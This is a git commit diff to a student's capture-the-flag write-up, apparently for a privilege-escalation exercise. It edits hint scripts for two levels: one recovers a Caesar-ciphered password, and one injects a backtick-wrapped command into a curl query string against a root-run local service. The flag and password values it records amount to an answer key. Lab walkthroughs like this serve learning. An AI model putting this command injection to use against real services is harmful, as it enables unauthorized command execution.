8a8a615f7711f74d4f52b66bdcf8cf391ed80f0b
lgarczyn <lgarczyn@student.42.fr>
2019-04-03 15:11:28 +0200

    updated structure to match subject

--- level00/Ressources/hint.sh
+++ level00/Ressources/hint.sh
@@ -3,7 +3,7 @@ find / -group flag00 -user flag00 2> /dev/null
 # display
 cat /rofs/usr/bin/john # > cdiiddwpgswtgt
 # if you still had the README you could realize the result was coded using the Caesar cipher, use this site to decode
-https://cryptii.com/pipes/caesar-cipher # > nottoohardhere
+# https://cryptii.com/pipes/caesar-cipher # > nottoohardhere
 # escalate power level
 su level00
 nottoohardhere
--- level04/Ressources/hint.sh
+++ level04/Ressources/hint.sh
@@ -3,4 +3,5 @@
 # by running ps, we can see that it is running in root
 ps -eaf  | grep level04 #> root      1853  1814  0 04:44 ?        00:00:00 sshd: level04 [priv]
 # we can therefore send a request to it, usin whatever argument we want
+# we use an argument that will expend to the result of getflag
 curl -X GET localhost:4747/?x=\`getflag\` # > ne2searoevaevoem4ov4ar8ap
